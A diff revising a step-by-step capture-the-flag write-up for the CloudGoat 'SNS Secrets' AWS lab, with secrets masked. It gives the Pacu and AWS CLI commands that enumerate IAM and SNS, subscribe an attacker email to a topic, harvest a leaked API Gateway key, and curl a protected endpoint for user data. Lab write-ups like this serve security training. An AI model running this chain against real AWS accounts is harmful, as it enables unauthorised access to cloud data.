@@ -1,20 +1,21 @@
-# CloudGoat – SNS Secrets Walkthrough
+# SNS Exploit Walkthrough
 
-This document describes the exploitation process for the **SNS Secrets** scenario from CloudGoat.
+This document demonstrates the exploitation process for the **CloudGoat SNS Secrets scenario**.
 
-The objective of this lab is to demonstrate how misconfigured **SNS permissions and API Gateway access** can lead to disclosure of sensitive information such as API keys.
+The goal of the lab is to show how **SNS permissions combined with API Gateway misconfigurations** can lead to disclosure of sensitive information such as **API keys**.
 
+All credentials and identifiers have been **sanitized with `xxxx`** and the lab environment has already been **destroyed**.
 
 ---
 
 # Attack Path
 
 1. Scenario creation
-2. Initial IAM credentials obtained
+2. Initial AWS credentials obtained
 3. IAM permission enumeration
 4. SNS topic discovery
 5. Subscribe to SNS topic
-6. API key leaked through notification
+6. API key leaked via SNS notification
 7. API Gateway enumeration
 8. Construct API endpoint
 9. Access protected resource
@@ -23,44 +24,36 @@ The objective of this lab is to demonstrate how misconfigured **SNS permissions 
 
 # Creating the Scenario
 
-The lab environment is created using CloudGoat.
-
-```bash
+```javascript
 cloudgoat create sns_secrets
 ```
 
-After creating the scenario, the following credentials were provided:
+After creating the scenario we receive **AWS credentials**.
 
-```
-sns_user_access_key_id = AKIAxxxxxxxxxxxx
+```javascript
+sns_user_access_key_id = AKIAxxxxxxxxxxxxxxxx
 sns_user_secret_access_key = xxxxXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 ---
 
-# Initial Access
+# Configure AWS CLI Profile
 
-## Configure AWS CLI Profile
+Create a profile using the provided keys.
 
-Create a profile using the provided credentials.
-
-```bash
+```javascript
 aws configure --profile sns-secrets
 ```
 
-Verify the identity:
+Verify the identity.
 
-```bash
+```javascript
 aws sts get-caller-identity --profile sns-secrets
-```
 
-Example output:
-
-```json
 {
-  "UserId": "AIDAxxxxxxxxxxxx",
-  "Account": "xxxxxxxxxxxx",
-  "Arn": "arn:aws:iam::xxxxxxxxxxxx:user/cg-sns-user-xxxx"
+    "UserId": "AIDAxxxxxxxxxxxx",
+    "Account": "xxxxxxxxxxxx",
+    "Arn": "arn:aws:iam::xxxxxxxxxxxx:user/cg-sns-user-xxxx"
 }
 ```
 
@@ -68,159 +61,163 @@ Example output:
 
 # Discovering Permissions
 
-Now that we have access to an IAM user in the AWS environment, we need to determine what permissions are available.
+Now that we have access to an IAM user in the AWS environment, we need to determine the permissions available.
 
-First, list the policies attached to the user.
+List the policies attached to the user.
 
-```bash
-aws iam list-user-policies \
---user-name cg-sns-user-xxxx \
---profile sns-secrets
-```
+```javascript
+aws iam list-user-policies --user-name cg-sns-user-xxxx --profile sns-secrets
 
-Example output:
-
-```json
 {
-  "PolicyNames": [
-    "cg-sns-user-policy-xxxx"
-  ]
+    "PolicyNames": [
+        "cg-sns-user-policy-xxxx"
+    ]
 }
 ```
 
-Next, retrieve the policy document.
+Enumerate the policy.
 
-```bash
-aws iam get-user-policy \
---user-name cg-sns-user-xxxx \
---policy-name cg-sns-user-policy-xxxx \
---profile sns-secrets
-```
+```javascript
+aws iam get-user-policy --user-name cg-sns-user-xxxx --policy-name cg-sns-user-policy-xxxx --profile sns-secrets
 
-Example output:
-
-```json
 {
- "Version":"2012-10-17",
- "Statement":[
-  {
-   "Effect":"Allow",
-   "Action":[
-    "sns:Subscribe",
-    "sns:Receive",
-    "sns:ListSubscriptionsByTopic",
-    "sns:ListTopics",
-    "sns:GetTopicAttributes",
-    "iam:ListGroupsForUser",
-    "iam:ListUserPolicies",
-    "iam:GetUserPolicy",
-    "iam:ListAttachedUserPolicies",
-    "apigateway:GET"
-   ],
-   "Resource":"*"
-  }
- ]
+    "UserName": "cg-sns-user-xxxx",
+    "PolicyName": "cg-sns-user-policy-xxxx",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Action": [
+                    "sns:Subscribe",
+                    "sns:Receive",
+                    "sns:ListSubscriptionsByTopic",
+                    "sns:ListTopics",
+                    "sns:GetTopicAttributes",
+                    "iam:ListGroupsForUser",
+                    "iam:ListUserPolicies",
+                    "iam:GetUserPolicy",
+                    "iam:ListAttachedUserPolicies",
+                    "apigateway:GET"
+                ],
+                "Effect": "Allow",
+                "Resource": "*"
+            },
+            {
+                "Action": "apigateway:GET",
+                "Effect": "Deny",
+                "Resource": [
+                    "arn:aws:apigateway:us-east-1::/apikeys",
+                    "arn:aws:apigateway:us-east-1::/apikeys/*",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/methods/GET",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/integration",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration"
+                ]
+            }
+        ]
+    }
 }
 ```
 
-### Key Finding
-
-The IAM user has permissions to:
-
-- Enumerate SNS topics
-- Subscribe to SNS topics
-- Perform API Gateway GET requests
+The JSON above shows the permissions assigned to the IAM user.
 
 ---
 
 # Enumerating SNS Using Pacu
 
-Start Pacu and import the AWS credentials.
+Start Pacu and import the credentials.
 
-```bash
-import_keys sns-secrets
+```javascript
+Pacu (sns:No Keys Set) > import_keys sns-secrets
 ```
 
 Search for SNS modules.
 
-```bash
-search sns
+```javascript
+Pacu (sns:imported-sns-secrets) > search sns
+
+[Category: LATERAL_MOVE]
+
+    Subscribe to a Simple Notification Service (SNS) topic
+
+  sns__subscribe
+
+[Category: ENUM]
+
+    List and describe Simple Notification Service topics
+
+  sns__enum
 ```
 
-Example output:
+Run the enumeration module.
 
-```
-sns__subscribe
-sns__enum
-```
-
-Run the SNS enumeration module.
-
-```bash
-run sns__enum --region us-east-1
+```javascript
+Pacu (sns-secrets:imported-sns-secrets) > run sns__enum --region us-east-1
 ```
 
-Example output:
+Output:
 
-```
-Running module sns__enum...
+```javascript
+Pacu (sns:imported-sns-secrets) > run sns__enum --region us-east-1
+  Running module sns__enum...
 [sns__enum] Starting region us-east-1...
-[sns__enum] Found 1 topics
+[sns__enum]   Found 1 topics
+[sns__enum] sns__enum completed.
+
+[sns__enum] MODULE SUMMARY:
+
+Num of SNS topics found: 1 
+Num of SNS subscribers found: 0
 ```
 
-Retrieve detailed information stored by Pacu.
+Retrieve detailed topic information.
 
-```bash
-data sns
-```
+```javascript
+Pacu (sns:imported-sns-secrets) > data sns
 
-Example output:
-
-```json
 {
- "sns":{
-  "us-east-1":{
-   "arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx":{
-    "DisplayName":"",
-    "Owner":"xxxxxxxxxxxx",
-    "Subscribers":[]
-   }
+  "sns": {
+    "us-east-1": {
+      "arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx": {
+        "DisplayName": "",
+        "Owner": "xxxxxxxxxxxx",
+        "Subscribers": [],
+        "SubscriptionsConfirmed": "0",
+        "SubscriptionsPending": "0"
+      }
+    }
   }
- }
 }
 ```
 
 ---
 
-# Subscribing to the SNS Topic
+# Subscribing to SNS Topic
 
-The module `sns__subscribe` allows us to subscribe to an SNS topic using an email address.
+Check module help.
 
-View the module help:
-
-```bash
-help sns__subscribe
+```javascript
+Pacu (sns:imported-sns-secrets) > help sns__subscribe
 ```
 
-Run the module:
+Run the subscription module.
 
-```bash
-run sns__subscribe \
---topics arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx \
---email attacker@example.com
+```javascript
+Pacu (sns:imported-sns-secrets) > run sns__subscribe --topics arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx --email attacker@example.com
 ```
 
-Example output:
+Output:
 
+```javascript
+Running module sns__subscribe...
+[sns__subscribe] Subscribed successfully, check email for subscription confirmation.
+Confirmation ARN: arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
 ```
-Subscribed successfully, check email for confirmation.
-```
 
-After confirming the subscription via email, a notification is received containing an **API key**.
+After confirming the subscription, an **email notification** is received containing an API key.
 
-Example message:
-
-```
+```javascript
 DEBUG: API GATEWAY KEY xxxxXXXXXXXXXXXXXXXX
 ```
 
@@ -228,53 +225,56 @@ DEBUG: API GATEWAY KEY xxxxXXXXXXXXXXXXXXXX
 
 # Enumerating API Gateway
 
-Now that we have an API key, we can begin enumerating the API Gateway.
+Now that we have an API key, we enumerate API Gateway.
 
-List the available APIs.
+```javascript
+aws apigateway get-rest-apis --profile sns-secrets --region us-east-1
 
-```bash
-aws apigateway get-rest-apis \
---profile sns-secrets \
---region us-east-1
-```
-
-Example output:
-
-```json
 {
- "items":[
-  {
-   "id":"xxxxxx",
-   "name":"cg-api-xxxx",
-   "description":"API for demonstrating leaked API key scenario",
-   "rootResourceId":"xxxxxx"
-  }
- ]
+    "items": [
+        {
+            "id": "xxxxxx",
+            "name": "cg-api-xxxx",
+            "description": "API for demonstrating leaked API key scenario",
+            "createdDate": "xxxx",
+            "apiKeySource": "HEADER",
+            "endpointConfiguration": {
+                "types": [
+                    "EDGE"
+                ],
+                "ipAddressType": "ipv4"
+            },
+            "tags": {
+                "Scenario": "sns_secrets",
+                "Stack": "CloudGoat"
+            },
+            "disableExecuteApiEndpoint": false,
+            "rootResourceId": "xxxxxx"
+        }
+    ]
 }
 ```
 
 ---
 
-# Retrieving API Stages
+# Getting API Stages
 
-Identify the deployment stage.
+```javascript
+aws apigateway get-stages --rest-api-id xxxxxx --profile sns-secrets --region us-east-1
 
-```bash
-aws apigateway get-stages \
---rest-api-id xxxxxx \
---profile sns-secrets \
---region us-east-1
-```
-
-Example output:
-
-```json
 {
- "item":[
-  {
-   "stageName":"prod-xxxx"
-  }
- ]
+    "item": [
+        {
+            "deploymentId": "xxxxxx",
+            "stageName": "prod-xxxx",
+            "cacheClusterEnabled": false,
+            "cacheClusterStatus": "NOT_AVAILABLE",
+            "methodSettings": {},
+            "tracingEnabled": false,
+            "createdDate": "xxxx",
+            "lastUpdatedDate": "xxxx"
+        }
+    ]
 }
 ```
 
@@ -282,66 +282,84 @@ Example output:
 
 # Enumerating API Resources
 
-Next, enumerate available API resources.
+```javascript
+aws apigateway get-resources --rest-api-id xxxxxx --profile sns-secrets --region us-east-1
 
-```bash
-aws apigateway get-resources \
---rest-api-id xxxxxx \
---profile sns-secrets \
---region us-east-1
+{
+    "items": [
+        {
+            "id": "xxxxxx",
+            "parentId": "xxxxxx",
+            "pathPart": "user-data",
+            "path": "/user-data",
+            "resourceMethods": {
+                "GET": {}
+            }
+        },
+        {
+            "id": "xxxxxx",
+            "path": "/"
+        }
+    ]
+}
 ```
 
-Example output:
+Now we identify the resource path:
 
-```json
-{
- "items":[
-  {
-   "path":"/user-data"
-  }
- ]
-}
+```
+/user-data
 ```
 
 ---
 
-# Constructing the API Endpoint
+# Constructing the API URL
 
-The full API URL follows this structure:
+The API endpoint follows the structure:
 
 ```
-https://[API-ID].execute-api.us-east-1.amazonaws.com/[stage]/[resource]
+https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]
 ```
 
 Example:
 
-```
-https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data
+```javascript
+https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data -H 'x-api-key: xxxxXXXXXXXXXXXXXXXX'
 ```
 
 ---
 
-# Accessing the Protected Endpoint
+# Mission Accomplished
 
-Using the leaked API key, the endpoint can be accessed.
+Using the leaked **API Gateway key**, we were able to access the protected API endpoint.
 
-```bash
+```javascript
 curl https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data \
--H "x-api-key: xxxxXXXXXXXXXXXXXXXX"
+-H 'x-api-key: xxxxXXXXXXXXXXXXXXXX'
 ```
 
----
+Response:
 
-# Conclusion
+```javascript
+{
+  "final_flag": "FLAG{xxxxxxxxxxxxxxxxxxxx}",
+  "message": "Access granted",
+  "user_data": {
+    "email": "xxxx@xxxx.com",
+    "password": "xxxx",
+    "user_id": "xxxx",
+    "username": "xxxx"
+  }
+}
+```
 
-This lab demonstrates how misconfigured SNS permissions can allow attackers to subscribe to topics and receive sensitive information.
+This confirms successful access to the API and retrieval of sensitive information.
 
-By abusing SNS subscriptions, it was possible to:
+The attack chain involved:
 
-1. Discover an SNS topic
-2. Subscribe using an attacker-controlled email
-3. Receive a leaked API Gateway key
-4. Enumerate API Gateway resources
-5. Access protected API endpoints
-
-This scenario highlights the importance of properly restricting SNS access and preventing sensitive information from being distributed through automated notifications.
+1. Obtaining initial IAM credentials
+2. Enumerating SNS topics
+3. Subscribing to the SNS topic
+4. Receiving a leaked API Gateway key
+5. Enumerating API Gateway resources
+6. Constructing the API endpoint
+7. Accessing the protected endpoint to retrieve the final flag
